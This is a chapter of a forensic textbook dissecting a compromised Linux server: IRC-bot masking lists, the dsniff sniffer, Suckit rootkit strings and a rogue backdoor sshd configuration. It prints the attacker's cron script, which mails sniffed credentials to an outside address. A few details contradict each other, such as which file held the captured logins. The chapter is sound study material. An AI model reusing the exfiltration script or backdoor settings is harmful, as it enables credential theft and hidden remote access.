\chapter{Parasitic Infrastructure: IRC Bots and Malware}

During the early 2000s, the primary motivation of opportunistic automated threat actors was neither intellectual property theft nor data extortion (\textit{ransomware}), but the hijacking of bandwidth and compute resources to maintain dominance across IRC network channels. Implanting \textit{Eggdrop}, \textit{psyBNC}, and clandestine relay daemons turned academic servers into unwitting zombie nodes without their administrators' knowledge.

\begin{notaforense}[Process Spoofing Mechanism (\texttt{argv[0]} Masquerading)]
On Linux systems, the standard \texttt{ps} command reads argument strings directly from process memory (\texttt{/proc/<pid>/cmdline}). A malicious userland process can dynamically overwrite its own \texttt{argv[0]} buffer at runtime via \texttt{prctl()} or by directly manipulating argument pointers. In this manner, a hostile background daemon such as an IRC bot can cloak itself before administrators by masquerading as a legitimate system utility like \texttt{dnsquery}, \texttt{identd}, or \texttt{sysinit}. The forensic examiner defeats this evasion by inspecting the binary symlink at \texttt{/proc/<pid>/exe} and benchmarking its cryptographic checksum against the distribution's package database.
\end{notaforense}

\section{Inventory and Function of Suspicious Binaries in \texttt{/dev}}

We now examine the contents and operational roles of the anomalous files identified across the storage media, beginning with unauthorized entries located inside the \texttt{/dev} directory that were not part of the base operating system.

The contents of \texttt{/dev/.libn} were:

\vspace{1em}

\begin{lstlisting}[style=terminal]
kis
ircd
6667
186
17749
56321
51759
\end{lstlisting}

\vspace{1em}

The file \texttt{/dev/.libpt} contained a string dictionary leveraged by the malware to mask its presence in the system process table:

\vspace{1em}

\begin{lstlisting}[style=terminal]
dnsquery
-bash
linux
sysinit
db
identd
plogd
screen
ecko
popclean
\end{lstlisting}

\vspace{1em}

Likewise, the file \texttt{/dev/.libtp} defined simulated process names assigned to resident background jobs:

\vspace{1em}

\begin{lstlisting}[style=terminal]
 -bash
linux
dnsquery
sysinit
identd
plogd
db
screen
.tp
popclean
\end{lstlisting}

\vspace{1em}

Mirroring this structure, \texttt{/dev/.libtr} duplicated the cloaking aliases for active interception modules:

\vspace{1em}

\begin{lstlisting}[style=terminal]
-bash
linux
dnsquery
sysinit
identd
plogd
db
screen
.tp
popclean
\end{lstlisting}

\vspace{1em}

These files provided predefined simulation masks read dynamically by other malicious executables during execution.

The script scheduled under \texttt{/etc/cron.daily/dnsquery} contained the following routine:

\vspace{1em}

\begin{lstlisting}[style=terminal]
#!/bin/sh
cd /usr/lib/
./popclean -r pop.log > test
mail eckosniffer@yahoo.com -s "Sniff $(uname -a)" < test
kill -9 `/sbin/pidof /usr/lib/popclean`
rm -rf test pop.log
A=$PATH
export PATH=/usr/lib/
popclean -w pop.log &
export PATH=$A
\end{lstlisting}

\vspace{1em}

This automated script executed on a daily basis, invoking a binary named \texttt{popclean} that parsed captured session data from \texttt{pop.log}, redirected the output into temporary file \texttt{test}, emailed the exfiltrated credentials to a Yahoo account (\texttt{eckosniffer@yahoo.com}), terminated the active sniffer process, deleted the staging log files, and relaunched \texttt{popclean} in the background. This was the exact script whose ownership user \texttt{duende} attempted to reassign to root in order to evade discovery.

Analyzing the \texttt{popclean} binary:

\vspace{1em}

\begin{lstlisting}[style=terminal]
popclean: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), for GNU/Linux 2.0.0, 
dynamically linked (uses shared libs), not stripped
\end{lstlisting}

\vspace{1em}

Extracting printable text strings from this binary yielded the following revealing indicators (omitting boilerplate data):

\vspace{1em}

\begin{lstlisting}[style=terminal]
Version: 2.3
Usage: dsniff [-cdmn] [-i interface] [-s snaplen] [-f services]
              [-t trigger[,...]] [-r|-w savefile] [expression]
cdf:i:mnr:s:t:w:h?V
record_init
nids_init: %s
/usr/local/lib/dsniff.magic
/usr/local/lib/dsniff.services
listening on %s [%s]
listening on %s
\end{lstlisting}

\vspace{1em}

The program was in fact \texttt{dsniff} version 2.3. \texttt{dsniff} is a specialized network interception tool designed to harvest credentials passing through network interfaces attached to the host. This sniffer was executing continuously, exfiltrating stolen authentication tokens daily via automated email.

The contents of \texttt{/usr/local/lib/dsniff.services} revealed:

\vspace{1em}

\begin{lstlisting}[style=terminal]
vrrp        112/ip
ospf        89/ip
pptp        47/ip
icq        4000/udp
mmxp        2417/udp
sniffer        2001/udp
tds        1433/udp
rip        520/udp
mmxp        417/udp
snmp        161/udp
portmap        111/udp
portmap        -111/udp
pcanywhere    65301/tcp
aim        9898/tcp
napster        8888/tcp
http        8080/tcp
napster        7777/tcp
tds        7599/tcp
irc        6669/tcp
irc        6668/tcp
irc        6667/tcp
napster        6666/tcp
x11        6005/tcp
x11        6004/tcp
x11        6003/tcp
x11        6002/tcp
x11        6001/tcp
x11        6000/tcp
pcanywhere    5631/tcp
napster        5555/tcp
postgresql    5432/tcp
aim        5190/tcp
napster        4444/tcp
http        3128/tcp
tds        2638/tcp
mmxp        2417/tcp
cvs        2401/tcp
oracle        1526/tcp
oracle        1521/tcp
citrix        1494/tcp
tds        1433/tcp
socks        1080/tcp
smtp        587/tcp
rlogin        514/tcp
rlogin        513/tcp
rlogin        512/tcp
mmxp        417/tcp
ldap        389/tcp
telnet        261/tcp
imap        220/tcp
imap        143/tcp
smb        139/tcp
nntp        119/tcp
portmap        111/tcp
pop        110/tcp
pop        109/tcp
poppass        106/tcp
http        98/tcp
http        80/tcp
smtp        25/tcp
telnet        23/tcp
ftp        21/tcp
portmap        -111/tcp
yppasswd    100009/rpc
mountd        100005/rpc
ypserv        100004/rpc
\end{lstlisting}

\vspace{1em}

This represents the protocol and port interception target list configured for \texttt{dsniff}. The server was under targeted surveillance across every single one of these protocols.

Inspecting directory \texttt{/dev/zqft4} revealed:

\vspace{1em}

\begin{lstlisting}[style=terminal]
--w--w--w-    1 root     root       133730 May  9 22:00 .sniffer
-rw-r--r--    1 root     root            0 May  9 19:05 messages.hm
-rwxr-xr-x    1 root     root        28472 Apr  8 11:02 sk
\end{lstlisting}

\vspace{1em}

Examining the \texttt{sk} executable:

\vspace{1em}

\begin{lstlisting}[style=terminal]
sk: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, stripped
\end{lstlisting}

\vspace{1em}

Extracting embedded strings from \texttt{sk}:

\vspace{1em}

\begin{lstlisting}[style=terminal]
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:./bin:/dev/zqft4:/dev/zqft4/bin
HOME=/dev/zqft4
HISTFILE=/dev/null
PS1=\[\033[1;30m\][\[\033[0;32m\]\u\[\033[1;32m\]@\[\033[0;32m\]\h \[\033[1;37m\]\W\
    [\033[1;30m\]]\[\033[0m\]# 
SHELL=/bin/bash
TERM=linux
pqrstuvwxyzabcde
0123456789abcdef
/dev/ptmx
/dev/pty
/dev/tty
/dev/null
/dev/null
Can't open a tty, all in use ?
Can't fork subshell, there is no way...
/dev/zqft4
/bin/sh
Can't execve shell!
BD_Init: Starting backdoor daemon...
FUCK: Can't allocate raw socket (%d)
FUCK: Can't fork child (%d)
Done, pid=%d
/dev/zqft4/.rc
use:
%s <uivfp> [args]
u       - uninstall
i       - make pid invisible
v       - make pid visible
f [0/1] - toggle file hiding
p [0/1] - toggle pid hiding
Detected version: %s
FUCK: Failed to uninstall (%d)
Suckit uninstalled sucesfully!
FUCK: Failed to hide pid %d (%d)
Pid %d is hidden now!
FUCK: Failed to unhide pid %d (%d)
Pid %d is visible now!
file
Failed to change %s hiding (%d)!
%s hiding is now %s!
kmalloc
_kmalloc
__kmalloc
/dev/zqft4
/dev/kmem
FUCK: Can't open %s for read/write (%d)
RK_Init: idt=0x%08x, 
FUCK: IDT table read failed (offset 0x%08x)
FUCK: Can't find sys_call_table[]
sct[]=0x%08x, 
FUCK: Can't find kmalloc()!
kmalloc()=0x%08x, gfp=0x%x
FUCK: Can't read syscall %d addr
Z_Init: Allocating kernel-code memory...
FUCK: Out of kernel memory!
Done, %d bytes, base=0x%08x
/dev/kmem
/dev/null
core
FUCK: Got signal %d while manipulating kernel!
/sbin/init!
0123456789abcdefghijklmnopqrstuvwxyz
0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ
<NULL>
'Yi 
/dev/null
1.3b
/dev/zqft4/.sniffer
/proc/
/proc/net/
socket:[
/sbin/init
/sbin/init!
login
telnet
rlogin
rexec
passwd
adduser
mysql
ssword:
\end{lstlisting}

\vspace{1em}

This binary is the control tool for the infamous \textbf{Suckit} rootkit (version 1.3b). It hooks into the Linux kernel via \texttt{/dev/kmem}, overwrites the Interrupt Descriptor Table (IDT), hijacks system call pointers in \texttt{sys\_call\_table[]}, and creates hidden files such as \texttt{/dev/zqft4/.sniffer} while establishing an alternate init daemon: \texttt{/sbin/init!}.

The file \texttt{messages.hm} was empty, used as a temporary scratchpad.

Crucially, the file \texttt{.sniffer} contained private data harvested from encrypted connections. While SSH and SFTP enforce cryptographic encapsulation on the wire, an in-memory or daemon-level hook captures credentials \textbf{before} encryption occurs. By trojanizing authentication binaries such as \texttt{in.telnetd}, \texttt{login}, and \texttt{sshd}, credentials entered by local and remote users were logged in cleartext directly to \texttt{.sniffer}. The interception flow is illustrated in Figure~\ref{fig:mecanismo_sniffer}.

\begin{figure}[htbp]
\centering
\begin{tikzpicture}[
    scale=0.86,
    every node/.style={transform shape, font=\sffamily},
    clientbox/.style={draw=secondary, thick, fill=gray!8, rounded corners=3pt, align=center, minimum width=2.8cm, minimum height=1.3cm},
    daemonbox/.style={draw=accent, ultra thick, fill=accent!8, rounded corners=3pt, align=center, minimum width=3.4cm, minimum height=1.5cm},
    legitbox/.style={draw=primary, thick, fill=primary!8, rounded corners=3pt, align=center, minimum width=2.8cm, minimum height=1.3cm},
    filebox/.style={draw=accent, thick, fill=retobg, rounded corners=2pt, align=center, font=\scriptsize, minimum width=3.6cm, minimum height=1.2cm},
    flow/.style={draw=secondary, ultra thick, -{Stealth[length=2.5mm]}},
    leakflow/.style={draw=accent, ultra thick, dashed, -{Stealth[length=2.5mm]}}
]

\node[clientbox] (client) at (0.5, 2.2) {\textbf{User Session}\\\scriptsize Interactive Telnet / SSH\\\tiny In-flight credentials};
\node[daemonbox] (daemon) at (5.8, 2.2) {\textbf{Trojanized Daemon}\\\scriptsize \texttt{/usr/sbin/in.telnetd}\\\tiny PTY Hook / I/O Buffer};
\node[legitbox] (shell) at (11.0, 2.2) {\textbf{Legitimate Auth}\\\scriptsize \texttt{/bin/login} $\to$ \texttt{bash}\\\tiny Access granted};
\node[filebox] (dump) at (5.8, -0.6) {\textbf{Covert Logging}\\\scriptsize \texttt{/dev/rd/c2d3b2} or \texttt{.sniffer}\\\tiny Attributes: \texttt{chattr +i +a}};

\draw[flow] (client.east) -- (daemon.west) node[midway, above=2pt, font=\tiny\bfseries\color{secondary}] {Cleartext I/O};
\draw[flow] (daemon.east) -- (shell.west) node[midway, above=2pt, font=\tiny\bfseries\color{primary}] {Standard Pass};
\draw[leakflow] (daemon.south) -- (dump.north) node[midway, right=4pt, font=\tiny\bfseries\color{accent}] {Key Capture};

\end{tikzpicture}
\caption{Mechanism of covert credential capture prior to encryption within the terminal daemon.}
\label{fig:mecanismo_sniffer}
\end{figure}

\vspace{1em}

\begin{lstlisting}[style=terminal]
/usr/bin/ssh-agent -- kde2 :
/usr/lib/telnetlogin -h host-198.18.10.198-cust.telemedia.net.mx -p :
login -h host-198.18.10.198-cust.telemedia.net.mx -p :
helios login: Password: ********
/usr/lib/telnetlogin -h dup-200-64-239-90.prodigy.net.mx -p :
login -h dup-200-64-239-90.prodigy.net.mx -p :
helios login: Password: ********
/usr/lib/telnetlogin -h dup-200-64-239-90.prodigy.net.mx -p :
login -h dup-200-64-239-90.prodigy.net.mx -p :
helios login: 
Login timed out after 60 seconds.
/usr/lib/telnetlogin -h dup-200-64-239-90.prodigy.net.mx -p :
login -h dup-200-64-239-90.prodigy.net.mx -p :
helios login: Password: ********
scp -r /var/mail 192.0.2.250:/respaldo/mail/helios/ :
/usr/bin/ssh -x -oForwardAgent no -oClearAllForwardings yes 192.0.2.250 scp -r -t 
/respaldo/mail/helios/ :
The authenticity of host '192.0.2.250 (192.0.2.250)' can't be established.
RSA key fingerprint is 03:0d:65:1e:07:45:f8:fc:9d:b6:cd:87:8b:9a:23:28.
Are you sure you want to continue connecting (yes/no)? Warning: Permanently added 
'192.0.2.250' (RSA) to the list of known hosts.
/usr/lib/telnetlogin -h 192.0.2.250 -p :
login -h 192.0.2.250 -p :
helios login: Password: ********
ssh atlas :
alopez@atlas's password: ********
ssh -l alopez atlas :
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
Someone could be eavesdropping on you right now (man-in-the-middle attack)!
It is also possible that the RSA host key has just been changed.
The fingerprint for the RSA key sent by the remote host is
f2:58:b8:3d:eb:a5:1e:b8:70:71:3c:83:84:3a:fa:34.
Please contact your system administrator.
Add correct host key in /home/est/alopez/.ssh/known_hosts2 to get rid of this message.
Offending key in /home/est/alopez/.ssh/known_hosts2:3
RSA host key for atlas has changed and you have requested strict checking.
alopez@atlas's password: ********
/usr/lib/telnetlogin -h dup-200-64-123-100.prodigy.net.mx -p :
login -h dup-200-64-123-100.prodigy.net.mx -p :
helios login: Password: ********
/usr/lib/telnetlogin -h 192.0.2.250 -p :
login -h 192.0.2.250 -p :
\end{lstlisting}

\vspace{1em}

We now examine the suspicious files found in \texttt{/dev/rd}:

\vspace{1em}

\texttt{/dev/rd/c2d3b2}:

\vspace{1em}

\begin{lstlisting}[style=terminal]
# This is ssh server systemwide configuration file.

Port 56321
ListenAddress 0.0.0.0
HostKey /dev/rd/c6d0b2
RandomSeed /dev/rd/c6d3b2
ServerKeyBits 768
LoginGraceTime 600
KeyRegenerationInterval 3600
PermitRootLogin yes
IgnoreRhosts no
StrictModes yes
QuietMode yes
X11Forwarding yes
X11DisplayOffset 10
FascistLogging no
PrintMotd yes
KeepAlive yes
SyslogFacility DAEMON
RhostsAuthentication no
RhostsRSAAuthentication yes
RSAAuthentication yes
PasswordAuthentication yes
PermitEmptyPasswords yes
UseLogin no
# CheckMail no
PidFile /dev/rd/c0d0b1
# AllowHosts Lame
DenyHosts *.localhost 127.0.0.1
# Umask 022
SilentDeny yes
\end{lstlisting}

\vspace{1em}

This was an alternate OpenSSH server configuration file. Instead of referencing \texttt{/etc/ssh/sshd\_config}, a rogue daemon read this configuration and bound to TCP port \texttt{56321} instead of standard port \texttt{22}. Its private host key was set to \texttt{/dev/rd/c6d0b2}, its random seed file to \texttt{/dev/rd/c6d3b2}, and its process ID was stored in \texttt{/dev/rd/c0d0b1}. It explicitly permitted root login without restrictions (\texttt{PermitRootLogin yes}), ignored empty passwords, and suppressed connection logging (\texttt{QuietMode yes}, \texttt{SilentDeny yes}), functioning as an immediate administrative backdoor on demand.

The host key file \texttt{/dev/rd/c6d0b2} contained:

\vspace{1em}

\begin{lstlisting}[style=terminal]
SSH PRIVATE KEY FILE FORMAT 1.1
^0^0^0^0^0^0^0^0^4^0^4^0^183^21^^223^18^225^11^196^195^136^135L^222^252re^139}I^190^21^29:^204
^142^19|9^174^216^188^208^199mMb^177^229#^213^166^143-Q^202^163^222Ta^228^135^185^201^30^4O
^185_%^136r^144f^197^27^146^206d^29^207^193w^188^240^1306^234^133^209eN^193;iR^146
^158^175^165~^175^138^218*%^230)^132^18^191^172^127^230^174^7^190"uC^215c^234^251;
S^239^219^189$^215>rCP%^0^6#^0^0^0^16root@xxxbuck.com^198^207^198^207^3^252^11Uo^225
^173^212^16^^152^^255^235^30[^210^172^223F^206u^239^186^1540^190^156^177^6^21^25^131
^130r^22^173B^127^234^18S^171^170{^174^167`}^234r^241^184
}n>nZy^246^192g^129!^233#^157^201L^226[^146^254^189^144^0W^17^1379^221^217"F^224T*o
^214^215^195^169KNv^5^207^24ec^2^163jr^189pC^246b^233^1318
^241^174^233^211^184<^235^155^5O^18P^147.^176I^2^0^208M^245v^205^215VmQ^0M
^213a{k^223^169^176^165_{&0^30^4^219^151f^21^243<O^172^2483^231^208^11^^228}
^11^129$^2^153^255^243^148^168^242'^153^243^151^133F{^171^147^20J^4^2^0^208^188B
^140^28^253(^163^27^147kM^132^206w^244^2^226^130;_^201!J^216^0,^161=^129X^191^156
^172M,"^234^198^159c^161sxc\^187:V^245^24^130^221^197b%^187_^172K^235^241^219^2^0
^224^138%@h^218^194T^176AKi-^29^18^211^22%^7^3^137
?^186^211^149c.^135^137\^230/7!^217^27^213^210{^143^234l^204^157P^515^141H_?^177
^194^177i^178-^201^22e^255^0^0^0^0
\end{lstlisting}

\vspace{1em}

Noticeably, the embedded key comment identified \texttt{root@xxxbuck.com}. 

The configuration references \texttt{/dev/rd/c0d0b1} as its PID tracking file, owned by root:

\vspace{1em}

\begin{lstlisting}[style=terminal]
-rw-r--r--    1 root     root            5 Apr 11 15:55 c0d0b1
\end{lstlisting}

\vspace{1em}

Inspecting \texttt{/dev/rd/c0d0b1} confirmed the PID assigned to the rogue SSH server during its last run:

\vspace{1em}

\begin{lstlisting}[style=terminal]
6579
\end{lstlisting}

\vspace{1em}

The verified presence of unauthorized root-owned files mandated comprehensive static post-mortem analysis. However, prior to disconnecting the host, active monitoring of user \texttt{duende}'s live sessions was initiated to capture behavioral evidence.

\begin{retoforense}[Analysis of Interception Daemons and Sniffers]
This chapter established that binary \texttt{in.telnetd} was trojanized to dump harvested credentials into covert file \texttt{/dev/rd/c2d3b2}. If an investigator suspects that a running network daemon is actively tapping interactive sessions, which live forensic tools (\texttt{lsof}, \texttt{fuser}, \texttt{strace}) pinpoint the exact file descriptors and disk files opened by the suspected process?
\end{retoforense}

\begin{perspectiva20}[Contemporary Forensic Perspective: Command and Control (C2) Channels]
In the early 2000s, IRC bots represented the pinnacle of malicious remote administration due to their straightforward design and ability to coordinate thousands of nodes within password-protected channels. Today, Command and Control (C2) infrastructure has shifted to highly evasive architectures: asynchronous beacons over TLS 1.3 encrypted HTTPS, covert DNS tunneling, steganography embedded in images hosted across Content Delivery Networks (CDNs), and the exploitation of legitimate cloud APIs across Microsoft Graph, Telegram, and Discord.
\end{perspectiva20}
